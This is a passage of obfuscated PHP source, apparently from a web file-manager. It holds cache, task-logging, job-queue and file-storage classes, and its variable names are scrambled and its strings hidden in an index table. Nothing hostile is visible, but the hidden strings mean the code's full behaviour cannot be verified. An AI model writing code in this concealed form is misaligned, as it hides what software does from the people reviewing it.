self::init()->remove($ÁĞ£µŒ); CacheLock::unlock($ü…Ï‹—¤); return $ñŞáë¤º; } public static function removeMemory($ù²ü¸Í—) { $Ëµ©²º´ = self::key($ù²ü¸Í—); unset(self::$memoryCache[$Ëµ©²º´]); } public static function clearMemory($§¾ëõä© = false) { if ($§¾ëõä©) { $§¾ëõä© = self::key($§¾ëõä©); unset(self::$memoryCache[$§¾ëõä©]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ì¥ŞÒ°£][834])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ì¥ŞÒ°£][835])) { self::init()->clearTimeout(); } } } goto e²˜¨¯±À†; EåÍŞ†ê: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Î‡‡ ª, $¹ë†àÊõ = '', $Ô¡î¯â = 0, $Òñ˜‰¥ = '') { $£µı”Ïø =& $_SERVER[Ì¥ŞÒ°£]; $é›±ºÜŸ = new Task($Î‡‡ ª, $¹ë†àÊõ, $Ô¡î¯â, $Òñ˜‰¥); $GLOBALS[$£µı”Ïø[1751] . $Î‡‡ ª] = new TaskLog($£µı”Ïø[1651], $é›±ºÜŸ, $Òñ˜‰¥); return $é›±ºÜŸ; } public function __construct($´˜ˆÓàŸ = '', $¨»£à½¼ = '', $¨òÂ“•Í = '') { $­óÌğì =& $_SERVER[Ì¥ŞÒ°£]; if (!$´˜ˆÓàŸ) { $´˜ˆÓàŸ = $­óÌğì[1651]; } $­ÃŠ‰ì = $´˜ˆÓàŸ . $­óÌğì[386] . rand_string(10); if (!$¨òÂ“•Í) { $¨òÂ“•Í = $´˜ˆÓàŸ . $­óÌğì[53] . $¨òÂ“•Í; } switch ($´˜ˆÓàŸ) { case $­óÌğì[1651]: if (!$¨»£à½¼ || !$¨»£à½¼->task) { return echoLog($´˜ˆÓàŸ . $­óÌğì[1752]); } $®Ó„€úÜ = $¨»£à½¼; $­ÃŠ‰ì = $®Ó„€úÜ->task[$­óÌğì[399]]; $´˜ˆÓàŸ = $®Ó„€úÜ->task[$­óÌğì[399]]; if (!$®Ó„€úÜ->task[$­óÌğì[1567]]) { $®Ó„€úÜ->task[$­óÌğì[1567]] = $¨òÂ“•Í ? $¨òÂ“•Í : $´˜ˆÓàŸ; } break; case $­óÌğì[1753]: if (!$¨»£à½¼) { return echoLog($´˜ˆÓàŸ . $­óÌğì[1754]); } $œõÍİó = is_string($¨»£à½¼) ? array($¨»£à½¼) : $¨»£à½¼; $®Ó„€úÜ = new TaskFileTransfer($­ÃŠ‰ì, $´˜ˆÓàŸ, 0, $¨òÂ“•Í ? $¨òÂ“•Í : $œõÍİó[0]); foreach ($œõÍİó as $æ¿Àêô) { $®Ó„€úÜ->addPath($æ¿Àêô); } break; case $­óÌğì[313]: if (!$¨»£à½¼) { return echoLog($´˜ˆÓàŸ . $­óÌğì[1754]); } $œõÍİó = is_string($¨»£à½¼) ? array($¨»£à½¼) : $¨»£à½¼; $®Ó„€úÜ = new TaskZip($­ÃŠ‰ì, $´˜ˆÓàŸ, 0, $¨òÂ“•Í ? $¨òÂ“•Í : $œõÍİó[0]); foreach ($œõÍİó as $æ¿Àêô) { $®Ó„€úÜ->addPath($æ¿Àêô); } break; case $­óÌğì[1220]: if (!$¨»£à½¼) { return echoLog($´˜ˆÓàŸ . $­óÌğì[1754]); } $®Ó„€úÜ = new TaskUnZip($­ÃŠ‰ì, $´˜ˆÓàŸ, 0, $¨òÂ“•Í ? $¨òÂ“•Í : $¨»£à½¼); if ($¨»£à½¼) { $®Ó„€úÜ->addFile($¨»£à½¼); } break; case $­óÌğì[148]: $®Ó„€úÜ = new TaskHttp($­ÃŠ‰ì, $´˜ˆÓàŸ); break; default: return; break; } $this->task = $®Ó„€úÜ; $this->taskID = $­ÃŠ‰ì; Hook::bind($­óÌğì[1689], array($this, $­óÌğì[1755])); Hook::bind($­óÌğì[1691], array($this, $­óÌğì[1756])); Hook::bind($­óÌğì[1685], array($this, $­óÌğì[1757])); echoLog($­óÌğì[1758] . $®Ó„€úÜ->task[$­óÌğì[1567]]); } public function __destruct() { $this->end(); } public function end($çõú€¬ = '') { $ã—ó®„Ä =& $_SERVER[Ì¥ŞÒ°£]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($çõú€¬); $this->task = !1; $this->taskID = !1; Hook::unbind($ã—ó®„Ä[1689], array($this, $ã—ó®„Ä[1755])); Hook::unbind($ã—ó®„Ä[1691], array($this, $ã—ó®„Ä[1756])); Hook::unbind($ã—ó®„Ä[1685], array($this, $ã—ó®„Ä[1757])); } public function taskUpdate($ŸÏ³ı¿”) { $Éğ½£Ï =& $_SERVER[Ì¥ŞÒ°£]; if (!$ŸÏ³ı¿” || $this->taskID != $ŸÏ³ı¿”[$Éğ½£Ï[399]]) { return; } $‘Óß¼ö‹ = 20; $éã¹ãÅÛ = intval($ŸÏ³ı¿”[$Éğ½£Ï[1669]] * $‘Óß¼ö‹); $Æ íá³ø = $Éğ½£Ï[162] . str_repeat($Éğ½£Ï[887], $éã¹ãÅÛ) . $Éğ½£Ï[1019] . str_repeat($Éğ½£Ï[53], $‘Óß¼ö‹ - $éã¹ãÅÛ) . $Éğ½£Ï[164]; $× «íÄ = $Æ íá³ø . sprintf($Éğ½£Ï[1759], $ŸÏ³ı¿”[$Éğ½£Ï[1669]] * 100) . $Éğ½£Ï[1760]; $´¸»÷Éğ = $× «íÄ . $ŸÏ³ı¿”[$Éğ½£Ï[1668]] . $Éğ½£Ï[8] . $ŸÏ³ı¿”[$Éğ½£Ï[788]] . LNG($Éğ½£Ï[1761]); $šÄıƒ¦İ = $Éğ½£Ï[12]; if ($ŸÏ³ı¿”[$Éğ½£Ï[1745]]) { $´¸»÷Éğ = $× «íÄ . size_format($ŸÏ³ı¿”[$Éğ½£Ï[1668]]) . $Éğ½£Ï[8] . size_format($ŸÏ³ı¿”[$Éğ½£Ï[788]]); $šÄıƒ¦İ = size_format($ŸÏ³ı¿”[$Éğ½£Ï[1670]]) . $Éğ½£Ï[1762]; } if ($ŸÏ³ı¿”[$Éğ½£Ï[1069]]) { $ŸÏ³ı¿”[$Éğ½£Ï[1719]] = $ŸÏ³ı¿”[$Éğ½£Ï[1069]] . $Éğ½£Ï[53] . $ŸÏ³ı¿”[$Éğ½£Ï[1719]]; } if ($ŸÏ³ı¿”[$Éğ½£Ï[1719]]) { $İÑ…¡€” = $Éğ½£Ï[12]; if ($ŸÏ³ı¿”[$Éğ½£Ï[1721]]) { $İÑ…¡€” = size_format($ŸÏ³ı¿”[$Éğ½£Ï[1722]]) . $Éğ½£Ï[8] . size_format($ŸÏ³ı¿”[$Éğ½£Ï[1721]]); } $šÄıƒ¦İ .= $ŸÏ³ı¿”[$Éğ½£Ï[1719]] . $İÑ…¡€”; } if ($ŸÏ³ı¿”[$Éğ½£Ï[765]]) { $šÄıƒ¦İ .= $Éğ½£Ï[53] . size_format($ŸÏ³ı¿”[$Éğ½£Ï[1726]]) . $Éğ½£Ï[8] . size_format($ŸÏ³ı¿”[$Éğ½£Ï[765]]); } echoLog($´¸»÷Éğ . $Éğ½£Ï[53] . $šÄıƒ¦İ, !0); } public function taskEnd($ØğÎ¶Òå) { $’˜¥±óĞ =& $_SERVER[Ì¥ŞÒ°£]; if (!$ØğÎ¶Òå || $this->taskID != $ØğÎ¶Òå[$’˜¥±óĞ[399]]) { return; } $˜Èà¼ç¶ = $ØğÎ¶Òå ? $ØğÎ¶Òå[$’˜¥±óĞ[1668]] . $’˜¥±óĞ[8] . $ØğÎ¶Òå[$’˜¥±óĞ[788]] . LNG($’˜¥±óĞ[1761]) . $’˜¥±óĞ[71] : $’˜¥±óĞ[12]; echoLog($’˜¥±óĞ[1763] . $ØğÎ¶Òå[$’˜¥±óĞ[1567]] . ($ØğÎ¶Òå[$’˜¥±óĞ[453]] ? $’˜¥±óĞ[71] . $ØğÎ¶Òå[$’˜¥±óĞ[453]] : $’˜¥±óĞ[12]) . $’˜¥±óĞ[71] . $˜Èà¼ç¶ . $’˜¥±óĞ[1764] . sprintf($’˜¥±óĞ[1683], timeFloat() - $ØğÎ¶Òå[$’˜¥±óĞ[1671]]) . $’˜¥±óĞ[1684]); $this->end(); } public function taskKill($ôÓæ¡†Ô) { $Ğ‘Ì©”ı =& $_SERVER[Ì¥ŞÒ°£]; if (!$ôÓæ¡†Ô || $this->taskID != $ôÓæ¡†Ô[$Ğ‘Ì©”ı[399]]) { return; } echoLog($Ğ‘Ì©”ı[1765] . $ôÓæ¡†Ô[$Ğ‘Ì©”ı[1567]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\121\x75\x65\165\145\114\x65\x6e\147\164\x68"; const QUEUE_DATA = "\164\141\x73\x6b\121\x75\x65\165\x65\104\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($‡ÂËä, $×Œ’ôì¥ = array(), $¼İ§ÕÛ› = '', $Ë‹›ñü× = '') { $ğ³÷åò¸ =& $_SERVER[Ì¥ŞÒ°£]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ë‹›ñü× && array_find_by_field(self::$listData, $ğ³÷åò¸[94], $Ë‹›ñü×)) { return !0; } self::$listData[] = array($ğ³÷åò¸[264] => $‡ÂËä, $ğ³÷åò¸[1766] => $×Œ’ôì¥, $ğ³÷åò¸[453] => $¼İ§ÕÛ›, $ğ³÷åò¸[94] => $Ë‹›ñü×); return !0; } public static function addSubmit() { $×Ñ’ÆÌø =& $_SERVER[Ì¥ŞÒ°£]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($×Ñ’ÆÌø[1767] . json_encode_force(array_to_keyvalue(self::$listData, $×Ñ’ÆÌø[12], $×Ñ’ÆÌø[453])), $×Ñ’ÆÌø[1768]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ÓÌ”àñ, $–”ÊåÑ = array(), $¬²üÙ´ê = '', $’ÛŒÈ¥ü = '') { $Åú«á¬ä =& $_SERVER[Ì¥ŞÒ°£]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ÄÖƒ­äÔ = self::getAll(); if ($’ÛŒÈ¥ü && array_find_by_field($ÄÖƒ­äÔ, $Åú«á¬ä[94], $’ÛŒÈ¥ü)) { return !0; } $ÄÖƒ­äÔ[] = array($Åú«á¬ä[264] => $ÓÌ”àñ, $Åú«á¬ä[1766] => $–”ÊåÑ, $Åú«á¬ä[453] => $¬²üÙ´ê, $Åú«á¬ä[94] => $’ÛŒÈ¥ü); write_log($Åú«á¬ä[1767] . $¬²üÙ´ê, $Åú«á¬ä[1768]); self::setAll($ÄÖƒ­äÔ); return !0; } public static function run() { $´Û³ƒã¹ =& $_SERVER[Ì¥ŞÒ°£]; $áİîÒ· = self::getAll(); $ú¯¨³² = array_shift($áİîÒ·); if (!$ú¯¨³²) { return !1; } self::setAll($áİîÒ·); $¿âÆ­ˆ‘ = timeFloat(); try { Hook::apply($ú¯¨³²[$´Û³ƒã¹[264]], $ú¯¨³²[$´Û³ƒã¹[1766]]); } catch (Exception $ÖöÒ“Îç) { } $ç±›™Â¸ = number_format(timeFloat() - $¿âÆ­ˆ‘, 3) . $´Û³ƒã¹[1684]; write_log($´Û³ƒã¹[1769] . $ú¯¨³²[$´Û³ƒã¹[453]] . $´Û³ƒã¹[1770] . $ç±›™Â¸, $´Û³ƒã¹[1768]); return !0; } public static function count() { $ÓûøĞ¹ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ÓûøĞ¹) { return 0; } return intval($ÓûøĞ¹); } public static function getAll() { $ªÑì¶³œ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ªÑì¶³œ) { return array(); } return $ªÑì¶³œ; } public static function setAll($Ê’øÖä©) { $„²âÍ€ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Ê’øÖä©), $„²âÍ€); Cache::set(self::QUEUE_DATA, $Ê’øÖä©, $„²âÍ€); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Å¤ˆüûä, $ÜÓä€¿– = 5.0) { if (!$Å¤ˆüûä) { return; } $¾ÓÈ¿—õ = Cache::get($Å¤ˆüûä); if (!$¾ÓÈ¿—õ || timeFloat() - floatVal($¾ÓÈ¿—õ) >= $ÜÓä€¿–) { Cache::set($Å¤ˆüûä, timeFloat(), $ÜÓä€¿– * 10); return !0; } return !1; } public static function timeLimitCall($Ø¡¢÷£Ê, $âß§Ä¨ğ, $‰÷ş¥£¹, $ª’×é = 5.0) { $ŸàÓÀ‰ì =& $_SERVER[Ì¥ŞÒ°£]; if (!$Ø¡¢÷£Ê || !$âß§Ä¨ğ) { return; } self::$asyncAdd = !0; $™‰Ş·¹ = $ŸàÓÀ‰ì[1771]; $ÌÔÉá½¡ = Cache::get($™‰Ş·¹, !0); $Ÿ¥Â˜¬ = array($ŸàÓÀ‰ì[1772] => timeFloat(), $ŸàÓÀ‰ì[1773] => timeFloat(), $ŸàÓÀ‰ì[264] => $âß§Ä¨ğ, $ŸàÓÀ‰ì[1766] => $‰÷ş¥£¹, $ŸàÓÀ‰ì[203] => $ª’×é); if (is_array($ÌÔÉá½¡[$Ø¡¢÷£Ê])) { $Ÿ¥Â˜¬[$ŸàÓÀ‰ì[1773]] = $ÌÔÉá½¡[$Ø¡¢÷£Ê][$ŸàÓÀ‰ì[1773]]; } if (is_array($ÌÔÉá½¡[$Ø¡¢÷£Ê])) { if (timeFloat() - $ÌÔÉá½¡[$Ø¡¢÷£Ê][$ŸàÓÀ‰ì[1772]] < $Ÿ¥Â˜¬[$ŸàÓÀ‰ì[203]] * 0.3) { return; } $Ÿ¥Â˜¬[$ŸàÓÀ‰ì[1773]] = $ÌÔÉá½¡[$Ø¡¢÷£Ê][$ŸàÓÀ‰ì[1773]]; } $ÌÔÉá½¡[$Ø¡¢÷£Ê] = $Ÿ¥Â˜¬; Cache::set($™‰Ş·¹, $ÌÔÉá½¡, 60); Cache::removeMemory($™‰Ş·¹); write_log($ŸàÓÀ‰ì[1774] . $Ø¡¢÷£Ê . $ŸàÓÀ‰ì[71] . $âß§Ä¨ğ, $ŸàÓÀ‰ì[1768]); } public static function timeLimitCallLoop() { $Ç‰ô÷“ü =& $_SERVER[Ì¥ŞÒ°£]; $‹œÁ®¯Æ = array($Ç‰ô÷“ü[1775]); $ûç®Â³µ = in_array(strtolower(ACTION), $‹œÁ®¯Æ); if (!$ûç®Â³µ && !self::$asyncAdd) { return; } $‹ø¹éÄÒ = $Ç‰ô÷“ü[1771]; $½¹Ã¶Åè = Cache::get($‹ø¹éÄÒ, !0); if (!$½¹Ã¶Åè || count($½¹Ã¶Åè) <= 0) { return; } $»‡˜Éç˜ = !1; $ñÅÇ¢Äª = timeFloat(); $èöÛÆ‚¡ = array(); foreach ($½¹Ã¶Åè as $ÂÙáÄÆÆ => $Ê¦ÖŠ´Ö) { if ($ñÅÇ¢Äª - $Ê¦ÖŠ´Ö[$Ç‰ô÷“ü[1773]] > $Ê¦ÖŠ´Ö[$Ç‰ô÷“ü[203]]) { $»‡˜Éç˜ = !0; try { Hook::apply($Ê¦ÖŠ´Ö[$Ç‰ô÷“ü[264]], $Ê¦ÖŠ´Ö[$Ç‰ô÷“ü[1766]]); write_log($Ç‰ô÷“ü[1776] . $ÂÙáÄÆÆ . $Ç‰ô÷“ü[71] . $Ê¦ÖŠ´Ö[$Ç‰ô÷“ü[264]] . $Ç‰ô÷“ü[1777] . ACTION, $Ç‰ô÷“ü[1768]); } catch (Exception $Ü¼‘ÀÒƒ) { } continue; } $èöÛÆ‚¡[$ÂÙáÄÆÆ] = $Ê¦ÖŠ´Ö; } if (!$»‡˜Éç˜) { return; } if (!$èöÛÆ‚¡) { return Cache::remove($‹ø¹éÄÒ); } Cache::set($‹ø¹éÄÒ, $èöÛÆ‚¡, 60); Cache::removeMemory($‹ø¹éÄÒ); } public static function finished($¢‡ƒÒñî, $½öÓ) { $¬®”‡éÜ =& $_SERVER[Ì¥ŞÒ°£]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¬®”‡éÜ[264] => $¢‡ƒÒñî, $¬®”‡éÜ[1766] => $½öÓ); } private static function finishedRun() { $ÌÖ»Ñ…­ =& $_SERVER[Ì¥ŞÒ°£]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ÅÎ»¤Œ„) { try { Hook::apply($ÅÎ»¤Œ„[$ÌÖ»Ñ…­[264]], $ÅÎ»¤Œ„[$ÌÖ»Ñ…­[1766]]); } catch (Exception $õ³«Ù¢Â) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto bˆÙÔÁù„…; dõ¢Ô¬¨„ğ: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\154\x65\x5f\143\157\156\164\145\x6e\164\x73"; protected $dataAuto = array(array("\143\x72\145\141\x74\145\x54\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\x73\x65\x72\164", "\x66\x75\156\143\x74\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\x6c\145"; protected $tableMeta = array("\x74\141\142\154\145\116\141\155\145" => "\x69\x6f\137\146\x69\x6c\x65\137\155\x65\x74\141", "\155\145\164\141\x46\x69\145\x6c\x64" => "\x66\151\154\x65\111\x44"); public function fileInfo($İ‰«ĞÕœ) { $± ¤Õâ° =& $_SERVER[Ì¥ŞÒ°£]; static $Öˆìß‚á = array(); if (!isset($Öˆìß‚á[$İ‰«ĞÕœ])) { $šÃêÉî‰ = $± ¤Õâ°[1906]; $ã‰ïÃÜ» = Model($± ¤Õâ°[471])->field($šÃêÉî‰)->where(array($± ¤Õâ°[469] => $İ‰«ĞÕœ))->find(); $Öˆìß‚á[$İ‰«ĞÕœ] = $ã‰ïÃÜ»; } return $Öˆìß‚á[$İ‰«ĞÕœ]; } public function addFileByContent($ÒİÉ•Î = '', $©í‚ÎÇÙ = '') { $áñÑÖ†† =& $_SERVER[Ì¥ŞÒ°£]; $÷Æòİñü = TEMP_PATH . $áñÑÖ††[1907]; if (!is_dir($÷Æòİñü)) { mk_dir($÷Æòİñü); } $÷É·Îàå = $÷Æòİñü . $áñÑÖ††[1908] . rand_string(16); file_put_contents($÷É·Îàå, $ÒİÉ•Î); $ó¥æÉôö = $this->addFile($÷É·Îàå, $©í‚ÎÇÙ, !0); if (file_exists($÷É·Îàå)) { @unlink($÷É·Îàå); } return $ó¥æÉôö; } public function createFileName($£šÂ¾šë, $”››Ÿß = false, $Ô½¦©ª = false) { $şı™Àğ =& $_SERVER[Ì¥ŞÒ°£]; $ÕõÌ˜â¯ = IO::init($şı™Àğ[8]); $ë¥œ¦ñ½ = $this->makeFilePath($£šÂ¾šë, $ÕõÌ˜â¯, $”››Ÿß, $Ô½¦©ª); $‹…ÃĞ²¬ = $ÕõÌ˜â¯->pathFather($ë¥œ¦ñ½); static $®ƒ¬Ö¿† = false; $œí¶ü‘Î = $şı™Àğ[1909] . md5($‹…ÃĞ²¬); if (!$®ƒ¬Ö¿† && !Cache::get($œí¶ü‘Î)) { $®ƒ¬Ö¿† = !0; $ÁÆğâÕÜ = IO::mkdir($‹…ÃĞ²¬); if (!IO::exist($ÁÆğâÕÜ . $şı™Àğ[799])) { IO::mkfile($ÁÆğâÕÜ . $şı™Àğ[799]); } Cache::set($œí¶ü‘Î, 1, 3600 * 2); } return $ë¥œ¦ñ½; } public function makeFilePath($âÄúàîš, $¤½È‰êŠ, $ÅÁÑ»² = false, $ÄÎ¾»²õ = false) { $ÜÚ›ü¿µ =& $_SERVER[Ì¥ŞÒ°£]; $áÄŒÙ°² = Model($ÜÚ›ü¿µ[772])->get($ÜÚ›ü¿µ[1910]); $¾ÉÔ‡¿‡ = KodIO::defaultIO() . date($ÜÚ›ü¿µ[1911]); $ ö§«Á = $¾ÉÔ‡¿‡ . rand_string(5) . short_id(100); $âÄúàîš = str_replace($ÜÚ›ü¿µ[8], $ÜÚ›ü¿µ[11], KodIO::clear($âÄúàîš)); $î›æ»É• = $¤½È‰êŠ->ext($âÄúàîš); if (!$âÄúàîš) { $áÄŒÙ°² = $ÜÚ›ü¿µ[1912]; } switch ($áÄŒÙ°²) { case $ÜÚ›ü¿µ[1913]: $ ö§«Á = $ ö§«Á . $ÜÚ›ü¿µ[10] . $¤½È‰êŠ->ext($âÄúàîš); if ($î›æ»É• == $ÜÚ›ü¿µ[1850]) { $ ö§«Á .= $ÜÚ›ü¿µ[1212]; } break; case $ÜÚ›ü¿µ[1914]: $‡Ñ©®Â = Model($ÜÚ›ü¿µ[772])->get($ÜÚ›ü¿µ[773]); $¦òàÕÌ¢ = substr(md5($ÜÚ›ü¿µ[774] . $‡Ñ©®Â . date($ÜÚ›ü¿µ[750])), 0, 8); $„ıû£—á = KodIO::defaultDriver(); $¾ÉÔ‡¿‡ = $ÜÚ›ü¿µ[1243] . $„ıû£—á[$ÜÚ›ü¿µ[399]] . $ÜÚ›ü¿µ[409] . date($ÜÚ›ü¿µ[1915]) . $¦òàÕÌ¢ . $ÜÚ›ü¿µ[8]; if ($î›æ»É• == $ÜÚ›ü¿µ[1850]) { $âÄúàîš .= $ÜÚ›ü¿µ[1212]; } $—‘À£©ñ = $ÜÚ›ü¿µ[1916] . $¾ÉÔ‡¿‡ . $âÄúàîš; CacheLock::lock($—‘À£©ñ); $ ö§«Á = $¾ÉÔ‡¿‡ . $âÄúàîš; if (IO::exist($¾ÉÔ‡¿‡ . $âÄúàîš)) { $´ñš¶³¨ = substr($âÄúàîš, 0, strlen($âÄúàîš) - strlen($î›æ»É•)); $¬¸óÉÍğ = $ÄÎ¾»²õ ? substr($ÄÎ¾»²õ, 0, 5) : ($ÅÁÑ»² ? substr($ÅÁÑ»², 0, 5) : rand_string(5)); $ ö§«Á = $¾ÉÔ‡¿‡ . $´ñš¶³¨ . $¬¸óÉÍğ . $ÜÚ›ü¿µ[10] . $î›æ»É•; } if (IO::isTypeObject($ ö§«Á) && !IO::isUploadServer($ ö§«Á)) { if (IO::exist($ ö§«Á)) { return $ ö§«Á; } $Şí‹ÇšÃ = IO::setContent($ ö§«Á, $ÜÚ›ü¿µ[12]); if (!$Şí‹ÇšÃ) { show_json($ÜÚ›ü¿µ[1917], !1); } } CacheLock::unlock($—‘À£©ñ); break; case $ÜÚ›ü¿µ[1912]: break; default: break; } return $ ö§«Á; } public function addFileByRemote($›Úùıšæ, $ÔªÔä•“, $‚ÇÃ‚ìÒ = array()) { $ş­Ú» =& $_SERVER[Ì¥ŞÒ°£]; if (!IO::exist($›Úùıšæ)) { return !1; } $õÌØ¬£ = $‚ÇÃ‚ìÒ[$ş­Ú»[176]] ? $‚ÇÃ‚ìÒ[$ş­Ú»[176]] : $ş­Ú»[12]; $Â‚Ï€Õ = IO::hashMd5($›Úùıšæ, $õÌØ¬£); $Öƒ©†×á = KodIO::defaultDriver(); $î¶Éã = array($ş­Ú»[585] => IO::size($›Úùıšæ), $ş­Ú»[1918] => 1, $ş­Ú»[420] => $ÔªÔä•“, $ş­Ú»[810] => $Öƒ©†×á[$ş­Ú»[399]], $ş­Ú»[421] => $›Úùıšæ, $ş­Ú»[1919] => $‚ÇÃ‚ìÒ[$ş­Ú»[177]] ? $‚ÇÃ‚ìÒ[$ş­Ú»[177]] : IO::hashSimple($›Úùıšæ), $ş­Ú»[1920] => $Â‚Ï€Õ ? $Â‚Ï€Õ : $õÌØ¬£); if ($İØéçƒ¨ = $this->addFileCheckExist($î¶Éã[$ş­Ú»[177]], $î¶Éã[$ş­Ú»[176]], $î¶Éã[$ş­Ú»[76]])) { return $İØéçƒ¨; } return $this->addFileData($î¶Éã); } private function addFileData($¸êê«‰œ) { $—Î¸ŠÒ =& $_SERVER[Ì¥ŞÒ°£]; if (!$¸êê«‰œ) { return !1; } $¸êê«‰œ[$—Î¸ŠÒ[76]] = intval($¸êê«‰œ[$—Î¸ŠÒ[76]]); if (!$¸êê«‰œ[$—Î¸ŠÒ[76]] && strlen($¸êê«‰œ[$—Î¸ŠÒ[177]]) > 32) { $¸êê«‰œ[$—Î¸ŠÒ[76]] = intval(substr($¸êê«‰œ[$—Î¸ŠÒ[177]], 32)); } $æÏïİÅì = $this->add($¸êê«‰œ); return $this->find($æÏïİÅì); } public function addFile($¨º“‚ø­, $¯âçŠø, $åÒ‡ß›· = false) { $äßî¥â =& $_SERVER[Ì¥ŞÒ°£]; $×âÍ‘Šµ = IO::hashSimple($¨º“‚ø­); $—üˆ…½‘ = IO::size($¨º“‚ø­); $ÃÌ¶ûÚé = $—üˆ…½‘ <= 1024 * 1024 * 10 ? IO::hashMd5($¨º“‚ø­) : $äßî¥â[12]; $ç¶ÒšÒ¸ = $äßî¥â[1921] . $×âÍ‘Šµ; CacheLock::lock($ç¶ÒšÒ¸); if ($ÃÌ¶ûÚé && $×âÍ‘Šµ) { $•³òøã¯ = $this->addFileCheckExist($×âÍ‘Šµ, $ÃÌ¶ûÚé, $—üˆ…½‘); if ($•³òøã¯) { CacheLock::unlock($ç¶ÒšÒ¸); return $•³òøã¯; } } $šÅ®Î‘Ê = $this->addFileMake($¨º“‚ø­, $—üˆ…½‘, $×âÍ‘Šµ, $ÃÌ¶ûÚé, $¯âçŠø, $åÒ‡ß›·); $æû­ğÏö = $this->addFileData($šÅ®Î‘Ê); CacheLock::unlock($ç¶ÒšÒ¸); if (!$ÃÌ¶ûÚé && $æû­ğÏö) { $this->fileMd5Check($æû­ğÏö); } return $æû­ğÏö; } private function fileMd5Check($¸ÊõŠ†·) { $ë‡¢¡ÍÎ =& $_SERVER[Ì¥ŞÒ°£]; $„Š´ŞÆÌ = array($¸ÊõŠ†·[$ë‡¢¡ÍÎ[468]], $¸ÊõŠ†·[$ë‡¢¡ÍÎ[84]]); $îÊ°¬ï = $ë‡¢¡ÍÎ[1922] . $¸ÊõŠ†·[$ë‡¢¡ÍÎ[84]]; $ÅãÌ”ÑÁ = $ë‡¢¡ÍÎ[1923] . $¸ÊõŠ†·[$ë‡¢¡ÍÎ[468]]; $©åŒíîà = TaskQueue::add($ë‡¢¡ÍÎ[1924], $„Š´ŞÆÌ, $îÊ°¬ï, $ÅãÌ”ÑÁ); if (!$©åŒíîà) { $this->fileMd5Set($¸ÊõŠ†·[$ë‡¢¡ÍÎ[468]], $¸ÊõŠ†·[$ë‡¢¡ÍÎ[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($®´×£€¹, $ÀâßıµĞ) { $³Ò”Ì¯ =& $_SERVER[Ì¥ŞÒ°£]; $’ºñÃ€ß = $this->find($®´×£€¹); if (!$’ºñÃ€ß || $’ºñÃ€ß[$³Ò”Ì¯[176]]) { return; } $üê¯ã‚ó = IO::hashMd5($ÀâßıµĞ); if (!$üê¯ã‚ó) { return $³Ò”Ì¯[12]; } $this->where(array($³Ò”Ì¯[468] => $®´×£€¹))->save(array($³Ò”Ì¯[176] => $üê¯ã‚ó)); } public function addFileMake($İˆ–ËÚÛ, $€Ÿå®³, $Ì™¯‰¸‘, $Ü½Š´àÂ, $êùı×’, $Ïöøª±ˆ) { $¹õ÷ğı‚ =& $_SERVER[Ì¥ŞÒ°£]; $¸ŸÁç¥ = $this->createFileName($êùı×’, $Ì™¯‰¸‘, $Ü½Š´àÂ); $‚ˆêŒ»Ğ = get_path_father($¸ŸÁç¥); $Ü´íÍ’ã = get_path_this($¸ŸÁç¥); if ($Ïöøª±ˆ) { $ç®ÂìÛ– = IO::move($İˆ–ËÚÛ, $‚ˆêŒ»Ğ, !1, $Ü´íÍ’ã); } else { $ç®ÂìÛ– = IO::copy($İˆ–ËÚÛ, $‚ˆêŒ»Ğ, !1, $Ü´íÍ’ã); } if (!$ç®ÂìÛ–) { return !1; } $íŒùúíĞ = KodIO::defaultDriver(); $ÖÈÀè•Ó = array($¹õ÷ğı‚[585] => $€Ÿå®³, $¹õ÷ğı‚[1918] => 1, $¹õ÷ğı‚[420] => $êùı×’, $¹õ÷ğı‚[810] => $íŒùúíĞ[$¹õ÷ğı‚[399]], $¹õ÷ğı‚[421] => $¸ŸÁç¥, $¹õ÷ğı‚[1919] => $Ì™¯‰¸‘, $¹õ÷ğı‚[1920] => $Ü½Š´àÂ); return $ÖÈÀè•Ó; } public function addFileCheckExist($²¸¾¨‰, $¹é¯ˆå, $”Ÿûë¹¿) { $ğÏûÃ¶ı =& $_SERVER[Ì¥ŞÒ°£]; $ÕÖ —Ê = $this->findByHash($²¸¾¨‰, $¹é¯ˆå); if (!$ÕÖ —Ê) { return !1; } $öÆõŞ“¯ = array($ğÏûÃ¶ı[1918] => intval($ÕÖ —Ê[$ğÏûÃ¶ı[1925]]) + 1, $ğÏûÃ¶ı[585] => $”Ÿûë¹¿); $this->where(array($ğÏûÃ¶ı[469] => $ÕÖ —Ê[$ğÏûÃ¶ı[468]]))->save($öÆõŞ“¯); return $ÕÖ —Ê; } public function remove($úğ£æÖ) { $this->linkCountChange($úğ£æÖ, !1); $this->clearEmpty(); return !0; } public function linkAdd($¢«í‹ãÀ) { $this->linkCountChange($¢«í‹ãÀ, !0); } public function linkCountChange($šê½Éªú, $³Ù©ÒÅ) { $¯şàÀâ =& $_SERVER[Ì¥ŞÒ°£]; if (!$šê½Éªú) { return; } if (!is_array($šê½Éªú)) { $šê½Éªú = array($šê½Éªú); } $ÛÓ˜ïĞ¿ = 